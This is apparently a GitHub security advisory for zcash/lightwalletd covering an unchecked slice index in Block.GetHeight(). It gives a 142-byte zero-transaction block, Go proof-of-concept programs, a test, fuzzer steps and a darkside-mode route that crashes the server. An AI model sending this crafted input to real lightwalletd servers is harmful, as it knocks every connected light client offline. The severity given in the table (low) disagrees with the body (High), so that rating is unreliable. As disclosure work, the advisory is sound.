# GHSA-jcrq-vv43-968c: Unhandled slice index panic in `Block.GetHeight()` when a block contains zero transactions (or a first transaction with zero transparent inputs)

| Field | Value |
| --- | --- |
| Repo | zcash/lightwalletd |
| GHSA | GHSA-jcrq-vv43-968c |
| CVE | none assigned |
| Severity | low (CVSS 3.7) |
| CWE | CWE-129 |
| Published | 2026-11-18T00:38:22Z |
| Updated | 2026-11-18T00:38:22Z |
| Affected | github.com/zcash/lightwalletd <= 0.6.1 (patched: 0.6.2) |
| Advisory URL | https://github.com/zcash/lightwalletd/security/advisories/GHSA-jcrq-vv43-968c |

## Description (verbatim)

### Summary

`parser.Block.GetHeight()` [here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/parser/block.go#L82) dereferences `b.vtx[0].transparentInputs[0].ScriptSig` with no bounds check. A block with `tx_count == 0` (or a first transaction with zero transparent inputs) parses successfully because `ParseFromSlice` accepts a zero transaction count and `rejectCountExceedingRemaining` never rejects `0`, leaving `b.vtx` empty; the subsequent `GetHeight`/`ToCompact` call then panics with `index out of range [0] with length 0`. The panic is reached from `common.getBlockFromRPC` on every block, via the background `BlockIngestor` [here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/common/common.go#L555) and client-facing `GetBlock`/`GetBlockRange` [see here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/common/common.go#L599), and the server installs no panic-recovery middleware (`cmd/root.go:144-181`), so the unrecovered panic crashes the entire `lightwalletd` process and disconnects all connected light clients.

**Severity:** High : a denial-of-service of light client server software (lightwalletd), as defined by the Zcash vulnerability categories.

**Impact:** A single malformed block reaching the parser terminates the node, and because the ingestor re-fetches the same height on restart, the crash repeats until the block is no longer served. It is not remotely triggerable by an unauthenticated client on a default node, the input must come from the backend node or the opt-in `--darkside-very-insecure` mode, so it is a server-wide DoS, not a remotely exploitable loss-of-funds or consensus violation.

### Details

`parser.Block.GetHeight()` extracts the block height from the coinbase transaction by reading a BIP34 height out of the coinbase script, and it does so by dereferencing two slices without any length check:
[see here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/parser/block.go#L78-L82)

```go

func (b *Block) GetHeight() int {
	if b.height != -1 {
		return b.height
	}
	coinbaseScript := bytestring.String(b.vtx[0].transparentInputs[0].ScriptSig)
	var heightNum int64
	if !coinbaseScript.ReadScriptInt64(&heightNum) {
		return -1
	}
	...
}
```

The expression `b.vtx[0].transparentInputs[0]` assumes (a) that `b.vtx` is non-empty, and (b) that `b.vtx[0].transparentInputs` is non-empty. Neither invariant is enforced by `Block.ParseFromSlice`, the only code that populates `b.vtx`:

[see here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/parser/block.go#L138-L162)

```go
var txCount int
if !s.ReadCompactSize(&txCount) {
	return nil, errors.New("could not read tx_count")
}
if err := rejectCountExceedingRemaining("tx_count", txCount, len(s), minTransactionWireBytes); err != nil {
	return nil, err
}
data = []byte(s)

vtx := make([]*Transaction, 0, txCount)
var i int
for i = 0; i < txCount && len(data) > 0; i++ {
	tx := NewTransaction()
	data, err = tx.ParseFromSlice(data)
	if err != nil {
		return nil, fmt.Errorf("error parsing transaction %d: %w", i, err)
	}
	vtx = append(vtx, tx)
}
if i < txCount {
	return nil, errors.New("parsing block transactions: not enough data")
}
b.hdr = hdr
b.vtx = vtx
return data, nil
```

Two specific properties of `ParseFromSlice` combine to make the panic reachable:

1. **`tx_count == 0` is accepted.** The guard `rejectCountExceedingRemaining("tx_count", txCount, len(s), minTransactionWireBytes)` rejects a count only when `count > remaining/minElementBytes`. With `txCount == 0`, `0 > x` is false for every non-negative `x`, so a zero transaction count always passes. The transaction loop `for i = 0; i < txCount && ...` never executes, and the trailing check `if i < txCount` is `0 < 0`, which is false. The function therefore returns `(nil, nil)` with `b.vtx` set to a zero-length slice. Nothing in the parser enforces the Zcash invariant that a block must contain at least one transaction (the coinbase).

2. **A transaction may legally carry zero transparent inputs.** `Transaction.ParseTransparent` [here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/parser/transaction.go#L112-L147) reads `tx_in_count` via `ReadCompactSize`, allocates `tx.transparentInputs = make([]txIn, txInCount)`, and fills it in a loop. If `tx_in_count == 0`, `transparentInputs` is an empty slice. The same zero-count acceptance applies (`rejectCountExceedingRemaining("tx_in_count", txInCount, ...)`), so a transaction with no transparent inputs parses successfully.

Either condition `txCount == 0` (empty `b.vtx`), or `txCount >= 1` with `b.vtx[0].transparentInputs` empty makes `GetHeight` index a zero-length slice and panic with `runtime error: index out of range [0] with length 0`.

The panic is triggered through the compact-block conversion path. `Block.ToCompact` calls `GetHeight`:
[see here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/parser/block.go#L109-L112)

```go
compactBlock := &walletrpc.CompactBlock{
	Height: uint64(b.GetHeight()),
	...
```

In the running server, `GetHeight` is reached from `common.getBlockFromRPC`, which calls it once for the height cross-check and again via `ToCompact` on every block fetched from the backend:
[see here](https://github.com/zcash/lightwalletd/blob/d16d48124e9ad4157ebc2324b5090c6ba201470c/common/common.go#L421-L432)

```go
if block.GetHeight() != height {
	return nil, errors.New("received unexpected height block")
}
...
r := block.ToCompact()
```

This is the exact input that the native fuzzer (`FuzzBlockParse`) reproduced (seed/crash entry `b4c00d2f7656317f`), confirmed by decoding the corpus entry: **142 bytes** — a 140-byte header (all bytes `0x30` in the fuzzer case), byte 140 = `0x00` (Equihash solution compact size of zero), byte 141 = `0x00` (`tx_count` of zero). The block header fields are not semantically validated during parsing (the header parser only performs bounded reads), so the malformed header still parses; the empty solution and zero transaction count then yield an empty `b.vtx`, and the subsequent `GetHeight`/`ToCompact` call panics.

### Proof of concept

Verified end-to-end. Here are complete reproduction instructions.

## Prerequisites

- Go 1.25+ (repo's `go.mod` declares `go 1.25.0`; tested with `go1.27.0 windows/amd64`).
- A checkout of `zcash/lightwalletd` at `d16d481` (tip, v0.5.4):
  ```powershell
  git clone https://github.com/zcash/lightwalletd.git
  cd lightwalletd
  ```
- No backend node (`zcashd`/`zebrad`) is required — the parser is exercised directly.

## PoC 1 — Standalone deterministic repro (primary, verified)

Create `poc_blockheight.go` at the module root:

```go
package main

import (
	"fmt"

	"github.com/zcash/lightwalletd/parser"
)

func main() {
	// 142-byte block serialization:
	//   bytes 0..139 : 140-byte header (version=4, all other fields zero)
	//   byte  140    : 0x00  CompactSize of the Equihash solution (length 0)
	//   byte  141    : 0x00  tx_count = 0  (no transactions, so no coinbase)
	data := make([]byte, 142)
	data[0] = 0x04 // version 4, little-endian

	block := parser.NewBlock()
	rest, err := block.ParseFromSlice(data)
	fmt.Printf("ParseFromSlice: rest=%d err=%v\n", len(rest), err)

	// BIP34 height extraction dereferences the coinbase's first input.
	// With tx_count == 0 there is no coinbase: this panics.
	h := block.GetHeight()
	fmt.Printf("GetHeight returned: %d\n", h)
}
```

Run it:

```powershell
go run .\poc_blockheight.go
```

Observed output (exit status 2):

```
ParseFromSlice: rest=0 err=<nil>
panic: runtime error: index out of range [0] with length 0

goroutine 1 [running]:
github.com/zcash/lightwalletd/parser.(*Block).GetHeight(...)
        C:/.../lightwalletd/parser/block.go:82 +0xf7
main.main()
        C:/.../lightwalletd/poc_blockheight.go:23 +0xf4
```

The key detail is that `ParseFromSlice` returns `rest=0 err=<nil>`, the block is accepted, and only the later `GetHeight()` call panics at `block.go:82`.

## PoC 2  Deterministic `go test` (no fuzz corpus dependency)

Add a test to `parser/` (self-contained, does not rely on any pre-existing seed):

```go
func TestGetHeightPanicsOnZeroTxBlock(t *testing.T) {
	blockBytes := make([]byte, 142)
	blockBytes[0] = 0x04  // version 4
	blockBytes[140] = 0x00 // empty equihash solution
	blockBytes[141] = 0x00 // tx_count = 0

	block := NewBlock()
	rest, err := block.ParseFromSlice(blockBytes)
	if err != nil || len(rest) != 0 {
		t.Fatalf("expected clean parse, rest=%d err=%v", len(rest), err)
	}
	defer func() {
		if r := recover(); r != nil {
			t.Logf("CONFIRMED panic: %v", r)
			return
		}
		t.Fatal("expected panic, got none")
	}()
	_ = block.ToCompact()
}
```

```powershell
go test ./parser -run TestGetHeightPanicsOnZeroTxBlock -v
```

This mirrors the exact crash the native fuzzer found: `ToCompact()` → `GetHeight()` → `b.vtx[0]`.

## PoC 3  Re-derive via the native fuzzer

```powershell
go test ./parser -run='^$' -fuzz=FuzzBlockParse -fuzztime=120s
```

The fuzzer converges on the same crashing input (sha `b4c00d2f7656317f`) within tens of seconds, writing the failing input to `parser/testdata/fuzz/FuzzBlockParse/` and reporting:

```
panic: runtime error: index out of range [0] with length 0
github.com/zcash/lightwalletd/parser.(*Block).GetHeight(...) parser/block.go:82
github.com/zcash/lightwalletd/parser.(*Block).ToCompact(...) parser/block.go:112
```

## PoC 4  Full server path (opt-in darkside mode)

This is the only route that exercises the panic through the running gRPC server, since the parser is otherwise fed solely by the backend node:

1. Start in darkside mode (no backend required):
   ```powershell
   go run . --darkside-very-insecure --no-tls-very-insecure --grpc-bind-addr 127.0.0.1:9067 --data-dir .\db --log-level 4
   ```
2. Using a `DarksideStreamerClient`, stage the 142-byte block above via `StageBlocksStream` (or `StageBlocksCreate`), then `ApplyStaged`, then request it via `GetBlock(height)`. The staged block flows through `common.DarksideStageBlockStream` → `parser.Block.ParseFromSlice` → `ToCompact` → `GetHeight`, panicking and terminating the process (no `recover()` is installed at `cmd/root.go:144-181`).

### Impact

The primary impact is an unhandled panic that terminates the entire `lightwalletd` process. The panic propagates out of the `GetHeight` call; the server configures no panic-recovery middleware (`grpc.NewServer` is created with only the logging and Prometheus interceptors, neither of which `recover()`s), and `Block.GetHeight`/`ToCompact` is invoked both by the background block ingestor goroutine (`BlockIngestor`) and by client-triggered `GetBlock`/`GetBlockRange` handlers via `getBlockFromRPC`. Because an unrecovered panic in any goroutine crashes the whole Go process, a single block whose `tx_count` is zero (or whose first transaction has zero transparent inputs) reaching the ingestor crashes the node, taking every connected light client down with it, a denial of service of the server.

The precondition is that such a block must actually be supplied to the parser. The parser's only data source in production is the configured backend node (`zcashd`/`zebrad`, which always produce blocks containing a coinbase), or the opt-in `--darkside-very-insecure` test mode (which lets a client stage arbitrary blocks through `StageBlocks`/`StageBlocksStream` and feed them into the same parse path). In other words, the panic is not triggerable by an unauthenticated gRPC client against a normally configured mainnet node; it is a robustness defect in code whose input is normally trusted, not a remotely reachable mainnet vulnerability. Consider a node started with the integration-testing flag `--darkside-very-insecure` (used by wallet teams to run controlled block scenarios). A test driver connects to the darkside gRPC service and stages a single block whose serialized form is 142 bytes: a 140-byte header (for example version 4 and zeroed-out fields), one byte `0x00` declaring an empty Equihash solution, and one byte `0x00` declaring `tx_count = 0`. The darkside framework stores the staged block and, when it is later re-parsed and converted to a compact block to serve it, `Block.GetHeight()` executes `b.vtx[0]` against the empty `vtx` slice and panics with `index out of range [0] with length 0`. The panic is not caught anywhere, so the entire `lightwalletd` process exits immediately, and every client connected to that server is disconnected. The same crash would occur on a normal node if its backend ever returned a block lacking a coinbase transaction.
